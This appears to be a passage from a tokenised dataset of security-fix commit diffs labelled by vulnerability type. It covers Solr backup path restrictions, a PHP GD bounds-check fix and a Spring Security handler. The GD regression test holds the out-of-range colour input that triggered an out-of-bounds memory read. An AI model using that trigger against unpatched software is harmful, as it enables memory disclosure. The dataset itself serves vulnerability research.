".", "junit", ".", "BeforeClass", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "org", ".", "slf4j", ".", "Logger", ";", "@", "@", "-", "72", ",", "6", "+", "73", ",", "12", "@", "@", "@", "BeforeClass", "public", "static", "void", "createCluster", "(", ")", "throws", "Exception", "{", "docsSeed", "=", "random", "(", ").", "nextLong", "(", ");", "System", ".", "setProperty", "(", "\"", "solr", ".", "allowPaths", "\"", ",", "\"", "*\"", ");", "}", "@", "AfterClass", "public", "static", "void", "afterClass", "(", ")", "throws", "Exception", "{", "System", ".", "clearProperty", "(", "\"", "solr", ".", "allowPaths", "\"", ");", "}", "/", "**", "@", "@", "-", "65", ",", "6", "+", "65", ",", "7", "@", "@", "@", "BeforeClass", "public", "static", "void", "setupClass", "(", ")", "throws", "Exception", "{", "useFactory", "(", "\"", "solr", ".", "StandardDirectoryFactory", "\"", ");", "System", ".", "setProperty", "(", "\"", "solr", ".", "allowPaths", "\"", ",", "\"", "*\"", ");", "configureCluster", "(", "NUM_NODES", ")", "//", "nodes", ".", "addConfig", "(", "\"", "conf1", "\"", ",", "TEST_PATH", "(", ").", "resolve", "(", "\"", "configsets", "\"", ").", "resolve", "(", "\"", "cloud", "-", "minimal", "\"", ").", "resolve", "(", "\"", "conf", "\"", "))", ".", "configure", "(", ");", "@", "@", "-", "76", ",", "6", "+", "77", ",", "7", "@", "@", "public", "static", "void", "setupClass", "(", ")", "throws", "Exception", "{", "public", "static", "void", "teardownClass", "(", ")", "throws", "Exception", "{", "System", ".", "clearProperty", "(", "\"", "test", ".", "build", ".", "data", "\"", ");", "System", ".", "clearProperty", "(", "\"", "test", ".", "cache", ".", "data", "\"", ");", "System", ".", "clearProperty", "(", "\"", "solr", ".", "allowPaths", "\"", ");", "}", "@", "Test", "@", "@", "-", "66", ",", "6", "+", "66", ",", "7", "@", "@", "@", "BeforeClass", "public", "static", "void", "setupClass", "(", ")", "throws", "Exception", "{", "System", ".", "setProperty", "(", "\"", "solr", ".", "allowPaths", "\"", ",", "\"", "*\"", ");", "useFactory", "(", "\"", "solr", ".", "StandardDirectoryFactory", "\"", ");", "configureCluster", "(", "1", ")", "//", "nodes", ".", "addConfig", "(", "\"", "conf1", "\"", ",", "TEST_PATH", "(", ").", "resolve", "(", "\"", "configsets", "\"", ").", "resolve", "(", "\"", "cloud", "-", "minimal", "\"", ").", "resolve", "(", "\"", "conf", "\"", "))", "@", "@", "-", "77", ",", "6", "+", "78", ",", "7", "@", "@", "public", "static", "void", "setupClass", "(", ")", "throws", "Exception", "{", "public", "static", "void", "teardownClass", "(", ")", "throws", "Exception", "{", "System", ".", "clearProperty", "(", "\"", "test", ".", "build", ".", "data", "\"", ");", "System", ".", "clearProperty", "(", "\"", "test", ".", "cache", ".", "data", "\"", ");", "System", ".", "clearProperty", "(", "\"", "solr", ".", "allowPaths", "\"", ");", "}", "@", "Test", "@", "@", "-", "16", ",", "16", "+", "16", ",", "11", "@", "@", "*", "/", "package", "org", ".", "apache", ".", "solr", ".", "handler", ";", "import", "java", ".", "io", ".", "File", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "util", ".", "Arrays", ";", "import", "org", ".", "apache", ".", "lucene", ".", "index", ".", "IndexCommit", ";", "import", "org", ".", "apache", ".", "lucene", ".", "index", ".", "DirectoryReader", ";", "import", "org", ".", "apache", ".", "lucene", ".", "index", ".", "IndexCommit", ";", "import", "org", ".", "apache", ".", "lucene", ".", "store", ".", "Directory", ";", "import", "org", ".", "apache", ".", "lucene", ".", "store", ".", "FSDirectory", ";", "import", "org", ".", "apache", ".", "lucene", ".", "util", ".", "TestUtil", ";", "import", "org", ".", "apache", ".", "solr", ".", "SolrTestCaseJ4", ";", "import", "org", ".", "apache", ".", "solr", ".", "common", ".", "params", ".", "CoreAdminParams", ";", "import", "org", ".", "apache", ".", "solr", ".", "core", ".", "CoreContainer", ";", "@", "@", "-", "34", ",", "8", "+", "29", ",", "12", "@", "@", "import", "org", ".", "junit", ".", "After", ";", "import", "org", ".", "junit", ".", "Before", ";", "public", "class", "TestCoreBackup", "extends", "SolrTestCaseJ4", "{", "import", "java", ".", "io", ".", "File", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "nio", ".", "file", ".", "Paths", ";", "import", "java", ".", "util", ".", "Arrays", ";", "public", "class", "TestCoreBackup", "extends", "SolrTestCaseJ4", "{", "@", "Before", "/", "/", "unique", "core", "per", "test", "public", "void", "coreInit", "(", ")", "throws", "Exception", "{", "initCore", "(", "\"", "solrconfig", ".", "xml", "\"", ",", "\"", "schema", ".", "xml", "\"", ");", "@", "@", "-", "63", ",", "6", "+", "62", ",", "7", "@", "@", "public", "void", "testBackupWithDocsNotSearchable", "(", ")", "throws", "Exception", "{", "String", "snapshotName", "=", "TestUtil", ".", "randomSimpleString", "(", "random", "(", "),", "1", ",", "5", ")", ";", "final", "CoreContainer", "cores", "=", "h", ".", "getCoreContainer", "(", ");", "cores", ".", "getAllowPaths", "(", ").", "add", "(", "Paths", ".", "get", "(", "location", ")", ");", "try", "(", "final", "CoreAdminHandler", "admin", "=", "new", "CoreAdminHandler", "(", "cores", ")", ")", "{", "SolrQueryResponse", "resp", "=", "new", "SolrQueryResponse", "(", ");", "admin", ".", "handleRequestBody", "@", "@", "-", "96", ",", "7", "+", "96", ",", "8", "@", "@", "public", "void", "testBackupBeforeFirstCommit", "(", ")", "throws", "Exception", "{", "final", "CoreAdminHandler", "admin", "=", "new", "CoreAdminHandler", "(", "cores", ")", ";", "final", "File", "backupDir", "=", "createTempDir", "(", ").", "toFile", "(", ");", "cores", ".", "getAllowPaths", "(", ").", "add", "(", "backupDir", ".", "toPath", "(", "))", ";", "{", "/", "/", "first", "a", "backup", "before", "we", "'", "ve", "ever", "done", "*", "anything", "*", "..", ".", "SolrQueryResponse", "resp", "=", "new", "SolrQueryResponse", "(", ");", "admin", ".", "handleRequestBody", "@", "@", "-", "197", ",", "8", "+", "198", ",", "9", "@", "@", "public", "void", "testBackupAfterSoftCommit", "(", ")", "throws", "Exception", "{", "final", "CoreAdminHandler", "admin", "=", "new", "CoreAdminHandler", "(", "cores", ")", ";", "final", "File", "backupDir", "=", "createTempDir", "(", ").", "toFile", "(", ");", "cores", ".", "getAllowPaths", "(", ").", "add", "(", "backupDir", ".", "toPath", "(", "))", ";", "{", "/", "/", "take", "an", "initial", "'", "backup1a", "'", "containing", "our", "1", "document", "final", "SolrQueryResponse", "resp", "=", "new", "SolrQueryResponse", "(", ");", "admin", ".", "handleRequestBody", "@", "@", "-", "1618", ",", "7", "+", "1618", ",", "9", "@", "@", "public", "void", "testShouldReportErrorWhenDeletingBackupButNameMissing", "(", ")", "{", "public", "void", "testEmptyBackups", "(", ")", "throws", "Exception", "{", "final", "File", "backupDir", "=", "createTempDir", "(", ").", "toFile", "(", ");", "final", "BackupStatusChecker", "backupStatus", "=", "new", "BackupStatusChecker", "(", "masterClient", ")", ";", "masterJetty", ".", "getCoreContainer", "(", ").", "getAllowPaths", "(", ").", "add", "(", "backupDir", ".", "toPath", "(", "))", ";", "{", "/", "/", "initial", "request", "w", "/", "o", "any", "committed", "docs", "final", "String", "backupName", "=", "\"", "empty_backup1", "\"", ";", "final", "GenericSolrRequest", "req", "=", "new", "GenericSolrRequest", "@", "@", "-", "125", ",", "6", "+", "125", ",", "7", "@", "@", "public", "void", "testSimpleRestore", "(", ")", "throws", "Exception", "{", "/", "/", "Use", "the", "default", "backup", "location", "or", "an", "externally", "provided", "location", ".", "if", "(", "random", "(", ").", "nextBoolean", "(", "))", "{", "location", "=", "createTempDir", "(", ").", "toFile", "(", ").", "getAbsolutePath", "(", ");", "masterJetty", ".", "getCoreContainer", "(", ").", "getAllowPaths", "(", ").", "add", "(", "Path", ".", "of", "(", "location", ")", ");", "/", "/", "Allow", "core", "to", "be", "created", "outside", "SOLR_HOME", "params", "+", "=", "\"", "&", "location", "=", "\"", "+", "URLEncoder", ".", "encode", "(", "location", ",", "\"", "UTF", "-", "8", "\"", ");", "}", "@", "@", "-", "181", ",", "11", "+", "182", ",", "21", "@", "@", "public", "void", "testSimpleRestore", "(", ")", "throws", "Exception", "{", "}", "public", "void", "testBackupFailsMissingAllowPaths", "(", ")", "throws", "Exception", "{", "final", "String", "params", "=", "\"", "&", "location", "=", "\"", "+", "URLEncoder", ".", "encode", "(", "createTempDir", "(", ").", "toFile", "(", ").", "getAbsolutePath", "(", "),", "\"", "UTF", "-", "8", "\"", ");", "Throwable", "t", "=", "expectThrows", "(", "IOException", ".", "class", ",", "(", ")", "-", ">", "{", "TestReplicationHandlerBackup", ".", "runBackupCommand", "(", "masterJetty", ",", "ReplicationHandler", ".", "CMD_BACKUP", ",", "params", ")", ";", "}", ");", "/", "/", "The", "backup", "command", "will", "fail", "since", "the", "tmp", "dir", "is", "outside", "allowPaths", "assertTrue", "(", "t", ".", "getMessage", "(", ").", "contains", "(", "\"", "Server", "returned", "HTTP", "response", "code", ":", "400", "\"", "))", ";", "}", "@", "Test", "public", "void", "testFailedRestore", "(", ")", "throws", "Exception", "{", "int", "nDocs", "=", "BackupRestoreUtils", ".", "indexDocs", "(", "masterClient", ",", "\"", "collection1", "\"", ",", "docsSeed", ")", ";", "String", "location", "=", "createTempDir", "(", ").", "toFile", "(", ").", "getAbsolutePath", "(", ");", "masterJetty", ".", "getCoreContainer", "(", ").", "getAllowPaths", "(", ").", "add", "(", "Path", ".", "of", "(", "location", ")", ");", "String", "snapshotName", "=", "TestUtil", ".", "randomSimpleString", "(", "random", "(", "),", "1", ",", "5", ")", ";", "String", "params", "=", "\"", "&", "name", "=", "\"", "+", "snapshotName", "+", "\"", "&", "location", "=", "\"", "+", "URLEncoder", ".", "encode", "(", "location", ",", "\"", "UTF", "-", "8", "\"", ");", "String", "baseUrl", "=", "masterJetty", ".", "getBaseUrl", "(", ").", "toString", "(", ");", "@", "@", "-", "17", ",", "20", "+", "17", ",", "10", "@", "@", "package", "org", ".", "apache", ".", "solr", ".", "handler", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "util", ".", "HashMap", ";", "import", "java", ".", "util", ".", "List", ";", "import", "java", ".", "util", ".", "Map", ";", "import", "org", ".", "apache", ".", "solr", ".", "client", ".", "solrj", ".", "ResponseParser", ";", "import", "org", ".", "apache", ".", "solr", ".", "client", ".", "solrj", ".", "SolrRequest", ";", "import", "org", ".", "apache", ".", "solr", ".", "client", ".", "solrj", ".", "SolrServerException", ";", "import", "org", ".", "apache", ".", "solr", ".", "client", ".", "solrj", ".", "impl", ".", "BaseHttpSolrClient", ";", "import", "org", ".", "apache", ".", "solr", ".", "client", ".", "solrj", ".", "impl", ".", "BinaryResponseParser", ";", "import", "org", ".", "apache", ".", "solr", ".", "client", ".", "solrj", ".", "impl", ".", "CloudSolrClient", ";", "import", "org", ".", "apache", ".", "solr", ".", "client", ".", "solrj", ".", "impl", ".", "NoOpResponseParser", ";", "import", "org", ".", "apache", ".", "solr", ".", "client", ".", "solrj", ".", "impl", ".", "XMLResponseParser", ";", "import", "org", ".", "apache", ".", "solr", ".", "client", ".", "solrj", ".", "impl", ".", "*;", "import", "org", ".", "apache", ".", "solr", ".", "client", ".", "solrj", ".", "request", ".", "CollectionAdminRequest", ";", "import", "org", ".", "apache", ".", "solr", ".", "client", ".", "solrj", ".", "request", ".", "V2Request", ";", "import", "org", ".", "apache", ".", "solr", ".", "client", ".", "solrj", ".", "response", ".", "DelegationTokenResponse", ";", "@", "@", "-", "42", ",", "6", "+", "32", ",", "12", "@", "@", "import", "org", ".", "junit", ".", "BeforeClass", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "nio", ".", "file", ".", "Paths", ";", "import", "java", ".", "util", ".", "HashMap", ";", "import", "java", ".", "util", ".", "List", ";", "import", "java", ".", "util", ".", "Map", ";", "public", "class", "V2ApiIntegrationTest", "extends", "SolrCloudTestCase", "{", "private", "static", "String", "COLL_NAME", "=", "\"", "collection1", "\"", ";", "@", "@", "-", "176", ",", "6", "+", "172", ",", "7", "@", "@", "public", "void", "testCollectionsApi", "(", ")", "throws", "Exception", "{", "backupParams", ".", "put", "(", "\"", "name", "\"", ",", "\"", "backup_test", "\"", ");", "backupParams", ".", "put", "(", "\"", "collection", "\"", ",", "COLL_NAME", ")", ";", "backupParams", ".", "put", "(", "\"", "location", "\"", ",", "tempDir", ")", ";", "cluster", ".", "getJettySolrRunners", "(", ").", "forEach", "(", "j", "-", ">", "j", ".", "getCoreContainer", "(", ").", "getAllowPaths", "(", ").", "add", "(", "Paths", ".", "get", "(", "tempDir", ")", "))", ";", "client", ".", "request", "(", "new", "V2Request", ".", "Builder", "(", "\"/", "c", "\"", ")", ".", "withMethod", "(", "SolrRequest", ".", "METHOD", ".", "POST", ")", ".", "withPayload", "(", "Utils", ".", "toJSONString", "(", "backupPayload", ")", ")", "@", "@", "-", "16", ",", "9", "+", "16", ",", "7", "@", "@", "*", "/", "package", "org", ".", "apache", ".", "solr", ".", "handler", ".", "admin", ";", "import", "java", ".", "io", ".", "File", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "com", ".", "carrotsearch", ".", "randomizedtesting", ".", "rules", ".", "SystemPropertiesRestoreRule", ";", "import", "org", ".", "apache", ".", "lucene", ".", "store", ".", "Directory", ";", "import", "org", ".", "apache", ".", "lucene", ".", "store", ".", "LockFactory", ";", "import", "org", ".", "apache", ".", "solr", ".", "SolrTestCaseJ4", ";", "@", "@", "-", "35", ",", "7", "+", "33", ",", "8", "@", "@", "import", "org", ".", "junit", ".", "rules", ".", "RuleChain", ";", "import", "org", ".", "junit", ".", "rules", ".", "TestRule", ";", "import", "com", ".", "carrotsearch", ".", "randomizedtesting", ".", "rules", ".", "SystemPropertiesRestoreRule", ";", "import", "java", ".", "io", ".", "File", ";", "import", "java", ".", "io", ".", "IOException", ";", "public", "class", "CoreMergeIndexesAdminHandlerTest", "extends", "SolrTestCaseJ4", "{", "@", "@", "-", "74", ",", "6", "+", "73", ",", "7", "@", "@", "public", "void", "testMergeIndexesCoreAdminHandler", "(", ")", "throws", "Exception", "{", "final", "File", "workDir", "=", "createTempDir", "(", ").", "toFile", "(", ");", "final", "CoreContainer", "cores", "=", "h", ".", "getCoreContainer", "(", ");", "cores", ".", "getAllowPaths", "(", ").", "add", "(", "workDir", ".", "toPath", "(", "))", ";", "try", "(", "final", "CoreAdminHandler", "admin", "=", "new", "CoreAdminHandler", "(", "cores", ")", ";", "SolrCore", "core", "=", "cores", ".", "getCore", "(", "\"", "collection1", "\"", "))", "{", "@", "@", "-", "328", ",", "7", "+", "328", ",", "30", "@", "@", "This", "command", "is", "useful", "for", "making", "periodic", "backups", ".", "There", "are", "several", "supported", "*", "`", "numberToKeep", ":", "`:", "This", "can", "be", "used", "with", "the", "backup", "command", "unless", "the", "`", "maxNumberOfBackups", "`", "initialization", "parameter", "has", "been", "specified", "on", "the", "handler", "\u2013", "in", "which", "case", "`", "maxNumberOfBackups", "`", "is", "always", "used", "and", "attempts", "to", "use", "the", "`", "numberToKeep", "`", "request", "parameter", "will", "cause", "an", "error", ".", "*", "`", "name", "`", ":", "(", "optional", ")", "Backup", "name", ".", "The", "snapshot", "will", "be", "created", "in", "a", "directory", "called", "`", "snapshot", ".", "<", "name", ">", "`", "within", "the", "data", "directory", "of", "the", "core", ".", "By", "default", "the", "name", "is", "generated", "using", "date", "in", "`", "yyyyMMddHHmmssSSS", "`", "format", ".", "If", "`", "location", "`", "parameter", "is", "passed", ",", "that", "would", "be", "used", "instead", "of", "the", "data", "directory", "*", "`", "location", "`", ":", "Backup", "location", ".", "*", "`", "repository", "`", ":", "The", "name", "of", "the", "backup", "repository", "to", "use", ".", "When", "not", "specified", ",", "it", "defaults", "to", "local", "file", "system", ".", "*", "`", "location", "`", ":", "Backup", "location", ".", "Value", "depends", "on", "the", "repository", "in", "use", ".", "For", "file", "system", "repository", ",", "location", "defaults", "to", "core", "'", "s", "dataDir", ",", "and", "if", "specified", ",", "it", "needs", "to", "be", "within", "`", "SOLR_HOME", "`", ",", "`", "SOLR_DATA_HOME", "`", "or", "the", "paths", "specified", "by", "solr", ".", "xml", "`", "allowPaths", "`", ".", "`", "restore", "`", "::", "Restore", "a", "backup", "from", "a", "backup", "repository", ".", "[", "source", ",", "bash", "]", "http", ":", "//", "_master_host", ":", "port_", "/", "solr", "/", "_core_name_", "/", "replication", "?", "command", "=", "restore", "This", "command", "is", "used", "to", "restore", "a", "backup", ".", "There", "are", "several", "supported", "request", "parameters", ":", "*", "`", "name", "`", ":", "(", "optional", ")", "Backup", "name", ".", "The", "name", "of", "the", "backed", "up", "index", "snapshot", "to", "be", "restored", ".", "If", "the", "name", "is", "not", "provided", ",", "it", "looks", "for", "backups", "with", "snapshot", ".", "<", "timestamp", ">", "format", "in", "the", "location", "directory", ".", "It", "picks", "the", "latest", "timestamp", "backup", "in", "that", "case", ".", "*", "`", "repository", "`", ":", "The", "name", "of", "the", "backup", "repository", "where", "the", "backup", "resides", ".", "When", "not", "specified", ",", "it", "defaults", "to", "local", "file", "system", ".", "*", "`", "location", "`", ":", "Backup", "location", ".", "Value", "depends", "on", "the", "repository", "in", "use", ".", "For", "file", "system", "repository", ",", "location", "defaults", "to", "core", "'", "s", "dataDir", ",", "and", "if", "specified", ",", "it", "needs", "to", "be", "within", "`", "SOLR_HOME", "`", ",", "`", "SOLR_DATA_HOME", "`", "or", "the", "paths", "specified", "by", "solr", ".", "xml", "`", "allowPaths", "`", ".", "`", "restorestatus", "`", "::", "Check", "the", "status", "of", "a", "running", "restore", "operation", ".", "[", "source", ",", "bash", "]", "http", ":", "//", "_master_host", ":", "port_", "/", "solr", "/", "_core_name_", "/", "replication", "?", "command", "=", "restorestatus", "This", "command", "is", "used", "to", "check", "the", "status", "of", "a", "restore", "operation", ".", "This", "command", "takes", "no", "parameters", ".", "The", "status", "value", "can", "be", "\"", "In", "Progress", "\"", ",", "\"", "success", "\"", "or", "\"", "failed", "\"", ".", "If", "it", "failed", "then", "an", "\"", "exception", "\"", "will", "also", "be", "sent", "in", "the", "response", ".", "`", "deletebackup", "`", "::", "Delete", "any", "backup", "created", "using", "the", "`", "backup", "`", "command", ".", "@", "@", "-", "77", ",", "7", "+", "77", ",", "8", "@", "@", "public", "void", "setUp", "(", ")", "throws", "Exception", "{", "if", "(", "log", ".", "isInfoEnabled", "(", "))", "{", "log", ".", "info", "(", "\"", "CORES", "=", "{}", ":", "{", "}\"", ",", "cores", ",", "cores", ".", "getLoadedCoreNames", "(", "))", ";", "}", "cores", ".", "getAllowPaths", "(", ").", "add", "(", "dataDir1", ".", "toPath", "(", "))", ";", "cores", ".", "getAllowPaths", "(", ").", "add", "(", "dataDir2", ".", "toPath", "(", "))", ";", "}", "@", "Override", "@", "@", "-", "91", ",", "6", "+", "91", ",", "7", "@", "@", "public", "static", "final", "String", "DEFAULT_CLOUD_SOLR_XML", "=", "\"", "<", "solr", ">", "\\", "n", "\"", "+", "\"", "\\", "n", "\"", "+", "\"", "<", "str", "name", "=", "\\\"", "shareSchema", "\\", "\">", "${", "shareSchema", ":", "false", "}", "</", "str", ">", "\\", "n", "\"", "+", "\"", "<", "str", "name", "=", "\\\"", "allowPaths", "\\", "\">", "${", "solr", ".", "allowPaths", ":", "}<", "/", "str", ">", "\\", "n", "\"", "\"", "<", "str", "name", "=", "\\\"", "configSetBaseDir", "\\", "\">", "${", "configSetBaseDir", ":", "configsets", "}", "</", "str", ">", "\\", "n", "\"", "+", "\"", "<", "str", "name", "=", "\\\"", "coreRootDirectory", "\\", "\">", "${", "coreRootDirectory", ":", ".}", "</", "str", ">", "\\", "n", "\"", "+", "\"", "<", "str", "name", "=", "\\\"", "collectionsHandler", "\\", "\">", "${", "collectionsHandler", ":", "solr", ".", "CollectionsHandler", "}", "</", "str", ">", "\\", "n", "\"", "+"], "docstring_tokens": ["input", "validation"]}
{"contents": ["Fix", "bug", "#70976:", "fix", "boundary", "check", "on", "gdImageRotateInterpolated"], "code_tokens": ["@", "@", "-", "4", ",", "6", "+", "4", ",", "10", "@", "@", "PHP", "NEWS", "?", "?", "?", "??", "2015", ",", "PHP", "5", ".", "5", ".", "31", "-", "GD", ":", ".", "Fixed", "bug", "#", "70976", "(", "Memory", "Read", "via", "gdImageRotateInterpolated", "Array", "Index", "Out", "of", "Bounds", ")", ".", "(", "emmanuel", "dot", "law", "at", "gmail", "dot", "com", ")", ".", "01", "Oct", "2015", ",", "PHP", "5", ".", "5", ".", "30", "-", "Phar", ":", "@", "@", "-", "2154", ",", "7", "+", "2154", ",", "7", "@", "@", "gdImagePtr", "gdImageRotateInterpolated", "(", "const", "gdImagePtr", "src", ",", "const", "float", "angle", ",", "in", "{", "const", "int", "angle_rounded", "=", "(", "int", ")", "floor", "(", "angle", "*", "100", ")", ";", "if", "(", "bgcolor", "<", "0", ")", "{", "if", "(", "bgcolor", "<", "0", "|", "|", "bgcolor", ">", "=", "gdMaxColors", ")", "{", "return", "NULL", ";", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "13", "@", "@", "-", "-", "TEST", "-", "-", "Bug", "#", "70976", "(", "Memory", "Read", "via", "gdImageRotateInterpolated", "Array", "Index", "Out", "of", "Bounds", ")", "-", "-", "SKIPIF", "-", "-", "<", "?", "php", "if", "(", "!", "extension_loaded", "(", "'", "gd", "'", "))", "{", "die", "(", "'", "skip", "gd", "extension", "not", "available", "'", ");", "}", "?", ">", "-", "-", "FILE", "-", "-", "<", "?", "php", "$", "img", "=", "imagerotate", "(", "imagecreate", "(", "1", ",", "1", ")", ",", "45", ",", "0x7ffffff9", ")", ";", "var_dump", "(", "$", "img", ")", ";", "?", ">", "-", "-", "EXPECTF", "-", "-", "bool", "(", "false", ")", "\\", "No", "newline", "at", "end", "of", "file"], "docstring_tokens": ["buffer", "over", "flow"]}
{"contents": ["Add", "accessDeniedHandler", "method", "to", "ExceptionHandlingSpec", "This", "allows", "to", "configure", "accessDeniedHandler", "in", "ExceptionTranslationWebFilter", "through", "ServerHttpSecurity.", "Issue:", "gh-5257"], "code_tokens": ["@", "@", "-", "171", ",", "6", "+", "171", ",", "8", "@", "@", "private", "List", "<", "DelegateEntry", ">", "defaultEntryPoints", "=", "new", "ArrayList", "<", ">(", ");", "private", "ServerAccessDeniedHandler", "accessDeniedHandler", ";", "private", "List", "<", "WebFilter", ">", "webFilters", "=", "new", "ArrayList", "<", ">(", ");", "private", "Throwable", "built", ";", "@", "@", "-", "526", ",", "6", "+", "528", ",", "9", "@", "@", "public", "SecurityWebFilterChain", "build", "(", ")", "{", "exceptionTranslationWebFilter", ".", "setAuthenticationEntryPoint", "(", "authenticationEntryPoint", ")", ";", "}", "if", "(", "accessDeniedHandler", "!", "=", "null", ")", "{", "exceptionTranslationWebFilter", ".", "setAccessDeniedHandler", "(", "accessDeniedHandler", ")", ";", "}", "this", ".", "addFilterAt", "(", "exceptionTranslationWebFilter", ",", "SecurityWebFiltersOrder", ".", "EXCEPTION_TRANSLATION", ")", ";", "this", ".", "authorizeExchange", ".", "configure", "(", "this", ")", ";", "}", "@", "@", "-", "793", ",", "6", "+", "798", ",", "18", "@", "@", "public", "ExceptionHandlingSpec", "authenticationEntryPoint", "(", "ServerAuthenticationEntryP", "return", "this", ";", "}", "/", "**", "*", "Configures", "what", "to", "do", "when", "an", "authenticated", "user", "does", "not", "hold", "a", "required", "authority", "*", "@", "param", "accessDeniedHandler", "the", "access", "denied", "handler", "to", "use", "*", "@", "return", "the", "{", "@", "link", "ExceptionHandlingSpec", "}", "to", "configure", "*", "*", "@", "since", "5", ".", "0", ".", "5", "*", "/", "public", "ExceptionHandlingSpec", "accessDeniedHandler", "(", "ServerAccessDeniedHandler", "accessDeniedHandler", ")", "{", "ServerHttpSecurity", ".", "this", ".", "accessDeniedHandler", "=", "accessDeniedHandler", ";", "return", "this", ";", "}", "/", "**", "*", "Allows", "method", "chaining", "to", "continue", "configuring", "the", "{", "@", "link", "ServerHttpSecurity", "}", "*", "@", "return", "the", "{", "@", "link", "ServerHttpSecurity", "}", "to", "continue", "configuring", "@", "@", "-", "0", ",", "0", "+", "1", ",", "143", "@", "@", "/", "*", "*", "Copyright", "2002", "-", "2018", "the", "original", "author", "or", "authors", ".", "*", "*", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "*", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "*", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "springframework", ".", "security", ".", "config", ".", "web", ".", "server", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "org", ".", "springframework", ".", "http", ".", "HttpStatus", ";", "import", "org", ".", "springframework", ".", "security", ".", "config", ".", "annotation", ".", "web", ".", "reactive", ".", "ServerHttpSecurityConfigurationBuilder", ";", "import", "org", ".", "springframework", ".", "security", ".", "test", ".", "web", ".", "reactive", ".", "server", ".", "WebTestClientBuilder", ";", "import", "org", ".", "springframework", ".", "security", ".", "web", ".", "server", ".", "SecurityWebFilterChain", ";", "import", "org", ".", "springframework", ".", "security", ".", "web", ".", "server", ".", "ServerAuthenticationEntryPoint", ";", "import", "org", ".", "springframework", ".", "security", ".", "web", ".", "server", ".", "authentication", ".", "RedirectServerAuthenticationEntryPoint", ";", "import", "org", ".", "springframework", ".", "security", ".", "web", ".", "server", ".", "authorization", ".", "HttpStatusServerAccessDeniedHandler", ";", "import", "org", ".", "springframework", ".", "security", ".", "web", ".", "server", ".", "authorization", ".", "ServerAccessDeniedHandler", ";", "import", "org", ".", "springframework", ".", "test", ".", "web", ".", "reactive", ".", "server", ".", "WebTestClient", ";", "import", "static", "org", ".", "springframework", ".", "web", ".", "reactive", ".", "function", ".", "client", ".", "ExchangeFilterFunctions", ".", "Credentials", ".", "basicAuthenticationCredentials", ";", "import", "static", "org", ".", "springframework", ".", "web", ".", "reactive", ".", "function", ".", "client", ".", "ExchangeFilterFunctions", ".", "basicAuthentication", ";", "/", "**", "*", "@", "author", "Denys", "Ivano", "*", "@", "since", "5", ".", "0", ".", "5", "*", "/", "public", "class", "ExceptionHandlingSpecTests", "{", "private", "ServerHttpSecurity", "http", "=", "ServerHttpSecurityConfigurationBuilder", ".", "httpWithDefaultAuthentication", "(", ");", "@", "Test", "public", "void", "defaultAuthenticationEntryPoint", "(", ")", "{", "SecurityWebFilterChain", "securityWebFilter", "=", "this", ".", "http", ".", "csrf", "(", ").", "disable", "(", ")", ".", "authorizeExchange", "(", ")", ".", "anyExchange", "(", ").", "authenticated", "(", ")", ".", "and", "(", ")", ".", "exceptionHandling", "(", ")", ".", "and", "(", ")", ".", "build", "(", ");", "WebTestClient", "client", "=", "WebTestClientBuilder", ".", "bindToWebFilters", "(", "securityWebFilter", ")", ".", "build", "(", ");", "client", ".", "get", "(", ")", ".", "uri", "(", "\"/", "test", "\"", ")", ".", "exchange", "(", ")", ".", "expectStatus", "(", ").", "isUnauthorized", "(", ")", ".", "expectHeader", "(", ").", "valueMatches", "(", "\"", "WWW", "-", "Authenticate", "\"", ",", "\"", "Basic", ".", "*\"", ");", "}", "@", "Test", "public", "void", "customAuthenticationEntryPoint", "(", ")", "{", "SecurityWebFilterChain", "securityWebFilter", "=", "this", ".", "http", ".", "csrf", "(", ").", "disable", "(", ")", ".", "authorizeExchange", "(", ")", ".", "anyExchange", "(", ").", "authenticated", "(", ")", ".", "and", "(", ")", ".", "exceptionHandling", "(", ")", ".", "authenticationEntryPoint", "(", "redirectServerAuthenticationEntryPoint", "(", "\"/", "auth", "\"", "))", ".", "and", "(", ")", ".", "build", "(", ");", "WebTestClient", "client", "=", "WebTestClientBuilder", ".", "bindToWebFilters", "(", "securityWebFilter", ")", ".", "build", "(", ");", "client", ".", "get", "(", ")", ".", "uri", "(", "\"/", "test", "\"", ")", ".", "exchange", "(", ")", ".", "expectStatus", "(", ").", "isFound", "(", ")", ".", "expectHeader", "(", ").", "valueMatches", "(", "\"", "Location", "\"", ",", "\"", ".*", "\")", ";", "}", "@", "Test", "public", "void", "defaultAccessDeniedHandler", "(", ")", "{", "SecurityWebFilterChain", "securityWebFilter", "=", "this", ".", "http", ".", "csrf", "(", ").", "disable", "(", ")", ".", "httpBasic", "(", ").", "and", "(", ")", ".", "authorizeExchange", "(", ")", ".", "anyExchange", "(", ").", "hasRole", "(", "\"", "ADMIN", "\"", ")", ".", "and", "(", ")", ".", "exceptionHandling", "(", ")", ".", "and", "(", ")", ".", "build", "(", ");", "WebTestClient", "client", "=", "WebTestClientBuilder", ".", "bindToWebFilters", "(", "securityWebFilter", ")", ".", "filter", "(", "basicAuthentication", "(", "))", ".", "build", "(", ");", "client", ".", "get", "(", ")", ".", "uri", "(", "\"/", "admin", "\"", ")", ".", "attributes", "(", "basicAuthenticationCredentials", "(", "\"", "user", "\"", ",", "\"", "password", "\"", "))", ".", "exchange", "(", ")", ".", "expectStatus", "(", ").", "isForbidden", "(", ");", "}", "@", "Test", "public", "void", "customAccessDeniedHandler", "(", ")", "{", 